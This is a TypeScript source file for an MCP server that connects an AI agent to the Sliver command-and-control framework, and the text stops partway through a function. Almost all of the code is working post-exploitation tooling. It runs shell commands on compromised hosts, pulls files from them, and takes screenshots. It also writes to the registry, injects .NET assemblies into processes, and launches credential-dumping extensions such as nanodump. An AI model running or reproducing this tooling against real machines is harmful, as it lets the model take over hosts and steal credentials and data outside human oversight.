#!/usr/bin/env node
/**
 * Sliver C2 MCP Server
 *
 * A Model Context Protocol server for interacting with Sliver C2 framework.
 * Provides tools for managing implants, sessions, beacons, listeners, and more.
 *
 * Uses sliver-py Python library via subprocess for reliable gRPC communication.
 */

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
  TextContent,
} from "@modelcontextprotocol/sdk/types.js";
import { spawn, execSync } from "child_process";
import { existsSync } from "fs";

// Configuration
interface SliverConfig {
  operatorConfigPath: string;
  pythonPath: string;
  timeout: number;
}

let config: SliverConfig = {
  operatorConfigPath: process.env.SLIVER_OPERATOR_CONFIG || "",
  pythonPath: process.env.PYTHON_PATH || "python3",
  timeout: parseInt(process.env.SLIVER_TIMEOUT || "30000"),
};

// Parse command line arguments
const args = process.argv.slice(2);
for (let i = 0; i < args.length; i++) {
  if (args[i] === "--operator-config" && args[i + 1]) {
    config.operatorConfigPath = args[i + 1];
    i++;
  } else if (args[i] === "--python" && args[i + 1]) {
    config.pythonPath = args[i + 1];
    i++;
  } else if (args[i] === "--timeout" && args[i + 1]) {
    config.timeout = parseInt(args[i + 1]);
    i++;
  }
}

/**
 * Execute a Sliver command via Python bridge
 */
async function executeSliverCommand(
  command: string,
  params: Record<string, unknown> = {}
): Promise<unknown> {
  return new Promise((resolve, reject) => {
    const pythonScript = `
import sys
import json
import asyncio

async def main():
    try:
        from sliver import SliverClientConfig, SliverClient

        config_path = ${JSON.stringify(config.operatorConfigPath)}
        if not config_path:
            print(json.dumps({"error": "No operator config file specified. Use --operator-config flag or SLIVER_OPERATOR_CONFIG env var"}))
            return

        config = SliverClientConfig.parse_config_file(config_path)
        client = SliverClient(config)
        await client.connect()

        command = ${JSON.stringify(command)}
        params = ${JSON.stringify(params)}

        result = await execute_command(client, command, params)
        print(json.dumps({"success": True, "data": result}))

    except ImportError as e:
        print(json.dumps({"error": f"sliver-py not installed: {str(e)}. Install with: pip install sliver-py"}))
    except FileNotFoundError as e:
        print(json.dumps({"error": f"Operator config file not found: {str(e)}"}))
    except Exception as e:
        print(json.dumps({"error": str(e)}))

async def execute_command(client, command, params):
    # Server info commands
    if command == "version":
        version = await client.version()
        return {"major": version.Major, "minor": version.Minor, "patch": version.Patch}

    elif command == "operators":
        operators = await client.operators()
        return [{"name": op.Name, "online": op.Online} for op in operators]

    # Session commands
    elif command == "sessions":
        sessions = await client.sessions()
        return [{
            "id": s.ID,
            "name": s.Name,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "remote_address": s.RemoteAddress,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
            "is_dead": s.IsDead
        } for s in sessions]

    elif command == "interact_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        interact = await client.interact_session(session_id)
        return {"success": True, "session_id": session_id}

    elif command == "kill_session":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}
        await client.kill_session(session_id)
        return {"success": True}

    # Beacon commands
    elif command == "beacons":
        import time as _time
        beacons = await client.beacons()
        now = int(_time.time())
        result = []
        for b in beacons:
            nc = b.NextCheckin
            if hasattr(nc, 'seconds'):
                nc_ts = nc.seconds
            elif hasattr(nc, 'timestamp'):
                nc_ts = int(nc.timestamp())
            else:
                nc_ts = int(nc) if nc else 0
            is_alive = nc_ts > now
            overdue_sec = max(0, now - nc_ts) if not is_alive else 0
            interval_sec = int(b.Interval) // 1_000_000_000 if b.Interval else 60
            result.append({
                "id": b.ID,
                "name": b.Name,
                "hostname": b.Hostname,
                "username": b.Username,
                "os": b.OS,
                "arch": b.Arch,
                "transport": b.Transport,
                "remote_address": b.RemoteAddress,
                "pid": b.PID,
                "interval_sec": interval_sec,
                "next_checkin_ts": nc_ts,
                "status": "ALIVE" if is_alive else "DEAD",
                "overdue_seconds": overdue_sec,
                "task_count": len(b.Tasks) if hasattr(b, 'Tasks') and b.Tasks else 0
            })
        return result

    elif command == "interact_beacon":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        interact = await client.interact_beacon(beacon_id)
        return {"success": True, "beacon_id": beacon_id}

    # Listener commands
    elif command == "jobs":
        jobs = await client.jobs()
        return [{
            "id": j.ID,
            "name": j.Name,
            "description": j.Description,
            "protocol": j.Protocol,
            "port": j.Port
        } for j in jobs]

    elif command == "start_mtls_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 8888)
        job = await client.start_mtls_listener(host, port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_https_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 443)
        domain = params.get("domain", "")
        job = await client.start_https_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_http_listener":
        host = params.get("host", "0.0.0.0")
        port = params.get("port", 80)
        domain = params.get("domain", "")
        job = await client.start_http_listener(host, port, domain=domain)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "start_dns_listener":
        domains = params.get("domains", [])
        job = await client.start_dns_listener(domains)
        return {"id": job.ID, "name": job.Name}

    elif command == "start_wg_listener":
        port = params.get("port", 53)
        job = await client.start_wg_listener(port)
        return {"id": job.ID, "name": job.Name, "port": job.Port}

    elif command == "kill_job":
        job_id = params.get("job_id")
        if not job_id:
            return {"error": "job_id required"}
        await client.kill_job(job_id)
        return {"success": True}

    # Implant generation commands
    elif command == "implant_builds":
        builds = await client.implant_builds()
        result = {}
        for name, build in builds.items():
            result[name] = {
                "id": build.ID,
                "name": build.Name,
                "os": build.GOOS,
                "arch": build.GOARCH,
                "format": str(build.Format),
                "is_beacon": build.IsBeacon
            }
        return result

    elif command == "generate":
        # Generate implant with specified options
        os_target = params.get("os", "linux")
        arch = params.get("arch", "amd64")
        format_type = params.get("format", "EXECUTABLE")
        c2_urls = params.get("c2", [])
        is_beacon = params.get("is_beacon", False)
        name = params.get("name", "")

        # This is a simplified version - actual generation requires more params
        return {"error": "Direct implant generation requires more complex setup. Use Sliver console for now."}

    elif command == "implant_profiles":
        profiles = await client.implant_profiles()
        return [{
            "name": p.Name,
            "config": {
                "os": p.Config.GOOS if p.Config else None,
                "arch": p.Config.GOARCH if p.Config else None,
                "is_beacon": p.Config.IsBeacon if p.Config else None
            }
        } for p in profiles]

    # Session interaction commands (require active session)
    elif command == "session_ls":
        session_id = params.get("session_id")
        path = params.get("path", ".")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ls_result = await interact.ls(path)
        return {
            "path": ls_result.Path,
            "exists": ls_result.Exists,
            "files": [{
                "name": f.Name,
                "is_dir": f.IsDir,
                "size": f.Size,
                "mode": str(f.Mode)
            } for f in ls_result.Files]
        }

    elif command == "session_pwd":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_cd":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.cd(path)
        pwd_result = await interact.pwd()
        return {"path": pwd_result.Path}

    elif command == "session_mkdir":
        session_id = params.get("session_id")
        path = params.get("path")
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.mkdir(path)
        return {"success": True, "path": path}

    elif command == "session_rm":
        session_id = params.get("session_id")
        path = params.get("path")
        recursive = params.get("recursive", False)
        if not session_id or not path:
            return {"error": "session_id and path required"}

        interact = await client.interact_session(session_id)
        await interact.rm(path, recursive=recursive)
        return {"success": True}

    elif command == "session_download":
        session_id = params.get("session_id")
        remote_path = params.get("remote_path")
        local_path = params.get("local_path", "")
        if not session_id or not remote_path:
            return {"error": "session_id and remote_path required"}

        interact = await client.interact_session(session_id)
        download = await interact.download(remote_path)
        size = len(download.Data) if download.Data else 0
        if local_path and download.Data:
            import os as _os
            _os.makedirs(_os.path.dirname(_os.path.abspath(local_path)), exist_ok=True)
            with open(local_path, 'wb') as _f:
                _f.write(download.Data)
        return {
            "path": download.Path,
            "size": size,
            "exists": download.Exists,
            "is_dir": download.IsDir,
            "saved_to": local_path if local_path and download.Data else None
        }

    elif command == "session_upload":
        session_id = params.get("session_id")
        local_path = params.get("local_path")
        remote_path = params.get("remote_path")
        if not session_id or not local_path or not remote_path:
            return {"error": "session_id, local_path, and remote_path required"}

        interact = await client.interact_session(session_id)
        with open(local_path, 'rb') as f:
            data = f.read()
        upload = await interact.upload(remote_path, data)
        return {"path": upload.Path, "success": True}

    elif command == "session_execute":
        session_id = params.get("session_id")
        exe = params.get("exe")
        args = params.get("args", [])
        output = params.get("output", True)
        if not session_id or not exe:
            return {"error": "session_id and exe required"}

        interact = await client.interact_session(session_id)
        result = await interact.execute(exe, args, output)
        return {
            "status": result.Status,
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "pid": result.Pid
        }

    elif command == "session_shell":
        session_id = params.get("session_id")
        command_str = params.get("command")
        if not session_id or not command_str:
            return {"error": "session_id and command required"}

        interact = await client.interact_session(session_id)
        # Use execute with shell
        if interact.os.lower() == "windows":
            result = await interact.execute("cmd.exe", ["/c", command_str], True)
        else:
            result = await interact.execute("/bin/sh", ["-c", command_str], True)
        return {
            "stdout": result.Stdout.decode('utf-8', errors='replace') if result.Stdout else "",
            "stderr": result.Stderr.decode('utf-8', errors='replace') if result.Stderr else "",
            "status": result.Status
        }

    elif command == "session_ps":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ps_result = await interact.ps()
        return [{
            "pid": p.Pid,
            "ppid": p.Ppid,
            "executable": p.Executable,
            "owner": p.Owner,
            "architecture": p.Architecture
        } for p in ps_result.Processes[:50]]  # Limit to 50

    elif command == "session_ifconfig":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        ifconfig = await interact.ifconfig()
        return [{
            "index": iface.Index,
            "name": iface.Name,
            "mac": iface.MAC,
            "addresses": [{"ip": addr.Ip, "mask": addr.Mask} for addr in iface.IPAddresses]
        } for iface in ifconfig.NetInterfaces]

    elif command == "session_netstat":
        session_id = params.get("session_id")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        netstat = await interact.netstat()
        return [{
            "local_addr": {"ip": e.LocalAddr.Ip, "port": e.LocalAddr.Port},
            "remote_addr": {"ip": e.RemoteAddr.Ip, "port": e.RemoteAddr.Port} if e.RemoteAddr else None,
            "protocol": e.Protocol,
            "state": e.SkState,
            "pid": e.Pid,
            "process": e.Process
        } for e in netstat.Entries[:50]]  # Limit to 50

    elif command == "session_screenshot":
        session_id = params.get("session_id")
        save_path = params.get("save_path", "/tmp/session_screenshot.png")
        if not session_id:
            return {"error": "session_id required"}

        interact = await client.interact_session(session_id)
        screenshot = await interact.screenshot()
        if screenshot.Data:
            with open(save_path, 'wb') as _f:
                _f.write(screenshot.Data)
        return {
            "success": True,
            "save_path": save_path,
            "size": len(screenshot.Data) if screenshot.Data else 0
        }

    elif command == "beacon_execute_bof":
        # execute_bof tidak tersedia di sliver-py wrapper.
        # Gunakan beacon_call_extension untuk armory extensions (CallExtension via gRPC),
        # atau beacon_sideload / beacon_execute_shellcode untuk raw shellcode.
        return {
            "error": "execute_bof tidak didukung sliver-py API. Gunakan beacon_call_extension untuk armory tools (nanodump, Seatbelt, dll), atau beacon_execute_assembly untuk .NET assemblies."
        }

    elif command == "beacon_call_extension":
        # Panggil armory extension yang sudah di-install via gRPC CallExtension
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ce
        from sliver.pb.commonpb import common_pb2 as _common_pb2ce
        beacon_id = params.get("beacon_id")
        extension_name = params.get("extension_name")  # e.g. "nanodump", "Seatbelt"
        args_b64 = params.get("args_b64", "")          # args as base64 bytes
        export_name = params.get("export_name", "")
        timeout_secs = int(params.get("timeout", 180))
        save_path = params.get("save_path", "")

        if not beacon_id or not extension_name:
            return {"error": "beacon_id and extension_name required"}

        import base64 as _b64
        args_bytes = _b64.b64decode(args_b64) if args_b64 else b""

        req = _sliver_pb2ce.CallExtensionReq(
            Name=extension_name,
            Export=export_name,
            Args=args_bytes,
            Request=_common_pb2ce.Request(BeaconID=beacon_id, Async=True)
        )
        resp = await client._stub.CallExtension(req)
        task_id = resp.Response.TaskID if resp.Response else ""

        if not task_id:
            return {"error": "No task_id returned — extension might not be installed. Run armory install first."}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ext_r = _sliver_pb2ce.CallExtension()
                    ext_r.ParseFromString(tc.Response)
                    output = ext_r.Output.decode('utf-8', errors='replace') if ext_r.Output else ""
                    if save_path and ext_r.Output:
                        import os as _os
                        _os.makedirs(_os.path.dirname(_os.path.abspath(save_path)), exist_ok=True)
                        with open(save_path, 'wb') as _f:
                            _f.write(ext_r.Output)
                    return {
                        "success": True, "task_id": task_id,
                        "output": output,
                        "size": len(ext_r.Output) if ext_r.Output else 0,
                        "saved_to": save_path if save_path and ext_r.Output else None
                    }
            except Exception:
                pass

        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_open_session":
        import time as _time
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))

        if not beacon_id:
            return {"error": "beacon_id required"}

        # Get sessions before, so we can detect new session after open
        sessions_before = await client.sessions()
        session_ids_before = {s.ID for s in sessions_before}

        # Queue OpenSession task on beacon via gRPC stub
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2
        from sliver.pb.commonpb import common_pb2 as _common_pb2
        msg = _sliver_pb2.OpenSession(
            Request=_common_pb2.Request(BeaconID=beacon_id)
        )
        await client._stub.OpenSession(msg)

        # Poll for new session to appear (beacon must check in to execute)
        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            sessions_now = await client.sessions()
            for s in sessions_now:
                if s.ID not in session_ids_before:
                    return {
                        "success": True,
                        "session_id": s.ID,
                        "name": s.Name,
                        "hostname": s.Hostname,
                        "username": s.Username
                    }

        return {
            "error": f"Timeout ({timeout_secs}s) — beacon belum buka session",
            "hint": "Beacon perlu check-in. Cek interval beacon dan coba lagi."
        }

    elif command == "beacon_delete":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        await client.kill_beacon(beacon_id)
        return {"success": True, "beacon_id": beacon_id}

    elif command == "beacon_execute":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2
        beacon_id = params.get("beacon_id")
        exe = params.get("exe")
        args_exec = params.get("args", [])
        output = params.get("output", True)
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not exe:
            return {"error": "beacon_id and exe required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2
        req = _sliver_pb2.ExecuteReq(Path=exe, Args=args_exec, Output=output, Request=_common_pb2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Execute(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Execute gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    exec_resp = _sliver_pb2.Execute()
                    exec_resp.ParseFromString(task_content.Response)
                    return {
                        "success": True,
                        "task_id": task_id,
                        "status": exec_resp.Status,
                        "stdout": exec_resp.Stdout.decode('utf-8', errors='replace') if exec_resp.Stdout else "",
                        "stderr": exec_resp.Stderr.decode('utf-8', errors='replace') if exec_resp.Stderr else "",
                        "pid": exec_resp.Pid
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum eksekusi", "task_id": task_id}

    elif command == "beacon_upload":
        import time as _time
        beacon_id = params.get("beacon_id")
        local_path = params.get("local_path")
        remote_path = params.get("remote_path")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not local_path or not remote_path:
            return {"error": "beacon_id, local_path, and remote_path required"}

        with open(local_path, 'rb') as _f:
            data = _f.read()

        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2up
        from sliver.pb.commonpb import common_pb2 as _common_pb2up
        req = _sliver_pb2up.UploadReq(Path=remote_path, Data=data, Request=_common_pb2up.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Upload(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Upload gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    return {"success": True, "task_id": task_id, "remote_path": remote_path, "size": len(data)}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum upload", "task_id": task_id}

    elif command == "beacon_screenshot":
        import time as _time
        beacon_id = params.get("beacon_id")
        save_path = params.get("save_path", "/tmp/beacon_screenshot.png")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2sc
        from sliver.pb.commonpb import common_pb2 as _common_pb2sc
        req = _sliver_pb2sc.ScreenshotReq(Request=_common_pb2sc.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Screenshot(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Screenshot gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                task_content = await client.beacon_task_content(task_id)
                if task_content and task_content.Response:
                    from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2b
                    ss = _sliver_pb2b.Screenshot()
                    ss.ParseFromString(task_content.Response)
                    if ss.Data:
                        with open(save_path, 'wb') as _f:
                            _f.write(ss.Data)
                        return {"success": True, "task_id": task_id, "save_path": save_path, "size": len(ss.Data)}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum screenshot", "task_id": task_id}

    elif command == "beacon_download":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2d
        beacon_id = params.get("beacon_id")
        remote_path = params.get("remote_path")
        local_path = params.get("local_path", "")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not remote_path:
            return {"error": "beacon_id and remote_path required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2dl
        req = _sliver_pb2d.DownloadReq(Path=remote_path, Request=_common_pb2dl.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Download(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Download gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    dl = _sliver_pb2d.Download()
                    dl.ParseFromString(tc.Response)
                    size = len(dl.Data) if dl.Data else 0
                    if local_path and dl.Data:
                        import os as _os
                        _os.makedirs(_os.path.dirname(_os.path.abspath(local_path)), exist_ok=True)
                        with open(local_path, 'wb') as _f:
                            _f.write(dl.Data)
                    return {
                        "success": True, "task_id": task_id,
                        "path": dl.Path, "size": size,
                        "exists": dl.Exists, "is_dir": dl.IsDir,
                        "saved_to": local_path if local_path and dl.Data else None
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s) — beacon belum download", "task_id": task_id}

    elif command == "beacon_ls":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ls
        beacon_id = params.get("beacon_id")
        path = params.get("path", ".")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2ls2
        req = _sliver_pb2ls.LsReq(Path=path, Request=_common_pb2ls2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Ls(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Ls gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ls_r = _sliver_pb2ls.Ls()
                    ls_r.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "path": ls_r.Path, "exists": ls_r.Exists,
                        "files": [{"name": f.Name, "is_dir": f.IsDir, "size": f.Size, "mode": str(f.Mode)} for f in ls_r.Files]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_ps":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2ps
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2ps2
        req = _sliver_pb2ps.PsReq(Request=_common_pb2ps2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Ps(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Ps gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ps_r = _sliver_pb2ps.Ps()
                    ps_r.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "processes": [{"pid": p.Pid, "ppid": p.Ppid, "exe": p.Executable, "owner": p.Owner, "arch": p.Architecture} for p in ps_r.Processes[:100]]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_ifconfig":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2if
        beacon_id = params.get("beacon_id")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id:
            return {"error": "beacon_id required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2if2
        req = _sliver_pb2if.IfconfigReq(Request=_common_pb2if2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.Ifconfig(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — Ifconfig gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ic = _sliver_pb2if.Ifconfig()
                    ic.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "interfaces": [{"index": i.Index, "name": i.Name, "mac": i.MAC, "addresses": [{"ip": a.Ip, "mask": a.Mask} for a in i.IPAddresses]} for i in ic.NetInterfaces]
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_registry_read":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2reg
        beacon_id = params.get("beacon_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not reg_path or not key:
            return {"error": "beacon_id, path, and key required"}

        from sliver.pb.commonpb import common_pb2 as _common_pb2rr
        req = _sliver_pb2reg.RegistryReadReq(Hive=hive, Path=reg_path, Key=key, Request=_common_pb2rr.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.RegistryRead(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — RegistryRead gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    rr = _sliver_pb2reg.RegistryRead()
                    rr.ParseFromString(tc.Response)
                    return {"success": True, "task_id": task_id, "value": rr.Value}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "beacon_registry_write":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2rw
        beacon_id = params.get("beacon_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        string_value = params.get("string_value", "")
        dword_value = int(params.get("dword_value", 0))
        reg_type = params.get("reg_type", "REG_SZ")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not reg_path or not key:
            return {"error": "beacon_id, path, and key required"}

        type_map = {"REG_SZ": 1, "REG_EXPAND_SZ": 2, "REG_BINARY": 3, "REG_DWORD": 4, "REG_QWORD": 11}
        reg_type_int = type_map.get(reg_type, 1)

        from sliver.pb.commonpb import common_pb2 as _common_pb2rw2
        req = _sliver_pb2rw.RegistryWriteReq(Hive=hive, Path=reg_path, Key=key, StringValue=string_value, DWordValue=dword_value, Type=reg_type_int, Request=_common_pb2rw2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.RegistryWrite(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — RegistryWrite gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    return {"success": True, "task_id": task_id, "hive": hive, "path": reg_path, "key": key}
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "session_registry_read":
        session_id = params.get("session_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        if not session_id or not reg_path or not key:
            return {"error": "session_id, path, and key required"}

        interact = await client.interact_session(session_id)
        rr = await interact.registry_read(hive, reg_path, key, "")
        return {"value": rr.Value}

    elif command == "session_registry_write":
        session_id = params.get("session_id")
        hive = params.get("hive", "HKCU")
        reg_path = params.get("path")
        key = params.get("key")
        string_value = params.get("string_value", "")
        dword_value = int(params.get("dword_value", 0))
        reg_type = params.get("reg_type", "REG_SZ")
        if not session_id or not reg_path or not key:
            return {"error": "session_id, path, and key required"}

        type_map = {"REG_SZ": 1, "REG_EXPAND_SZ": 2, "REG_BINARY": 3, "REG_DWORD": 4, "REG_QWORD": 11}
        reg_type_int = type_map.get(reg_type, 1)

        interact = await client.interact_session(session_id)
        await interact.registry_write(hive, reg_path, key, "", string_value, b"", dword_value, 0, reg_type_int)
        return {"success": True, "hive": hive, "path": reg_path, "key": key}

    elif command == "beacon_execute_assembly":
        import time as _time
        from sliver.pb.sliverpb import sliver_pb2 as _sliver_pb2asm
        beacon_id = params.get("beacon_id")
        assembly_path = params.get("assembly_path")
        arguments = params.get("arguments", "")
        process = params.get("process", "notepad.exe")
        is_dll = params.get("is_dll", False)
        arch = params.get("arch", "x86_64")
        class_name = params.get("class_name", "")
        method = params.get("method", "Main")
        app_domain = params.get("app_domain", "")
        timeout_secs = int(params.get("timeout", 120))
        if not beacon_id or not assembly_path:
            return {"error": "beacon_id and assembly_path required"}

        with open(assembly_path, 'rb') as _f:
            assembly_data = _f.read()

        from sliver.pb.commonpb import common_pb2 as _common_pb2asm2
        req = _sliver_pb2asm.ExecuteAssemblyReq(Assembly=assembly_data, Arguments=arguments, Process=process, IsDLL=is_dll, Arch=arch, ClassName=class_name, Method=method, AppDomain=app_domain, Request=_common_pb2asm2.Request(BeaconID=beacon_id, Async=True))
        resp = await client._stub.ExecuteAssembly(req)
        task_id = resp.Response.TaskID if resp and resp.Response else ""
        if not task_id:
            return {"error": "No task_id — ExecuteAssembly gRPC failed"}

        deadline = _time.time() + timeout_secs
        while _time.time() < deadline:
            await asyncio.sleep(10)
            try:
                tc = await client.beacon_task_content(task_id)
                if tc and tc.Response:
                    ea = _sliver_pb2asm.ExecuteAssembly()
                    ea.ParseFromString(tc.Response)
                    return {
                        "success": True, "task_id": task_id,
                        "output": ea.Output.decode('utf-8', errors='replace') if ea.Output else ""
                    }
            except Exception:
                pass
        return {"error": f"Timeout ({timeout_secs}s)", "task_id": task_id}

    elif command == "session_execute_assembly":
        session_id = params.get("session_id")
        assembly_path = params.get("assembly_path")
        arguments = params.get("arguments", "")
        process = params.get("process", "notepad.exe")
        is_dll = params.get("is_dll", False)
        arch = params.get("arch", "x86_64")
        class_name = params.get("class_name", "")
        method = params.get("method", "Main")
        app_domain = params.get("app_domain", "")
        if not session_id or not assembly_path:
            return {"error": "session_id and assembly_path required"}

        with open(assembly_path, 'rb') as _f:
            assembly_data = _f.read()

        interact = await client.interact_session(session_id)
        ea = await interact.execute_assembly(assembly_data, arguments, process, is_dll, arch, class_name, method, app_domain)
        return {"success": True, "output": ea.Output.decode('utf-8', errors='replace') if ea.Output else ""}

    elif command == "rename_beacon":
        beacon_id = params.get("beacon_id")
        name = params.get("name")
        if not beacon_id or not name:
            return {"error": "beacon_id and name required"}
        await client.rename_beacon(beacon_id, name)
        return {"success": True, "beacon_id": beacon_id, "name": name}

    elif command == "beacon_tasks":
        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return {"error": "beacon_id required"}
        tasks = await client.beacon_tasks(beacon_id)
        return [{
            "id": t.ID, "beacon_id": t.BeaconID,
            "created_at": t.CreatedAt,
            "state": t.State,
            "description": t.Description
        } for t in tasks]

    elif command == "prune_beacons":
        import time as _time
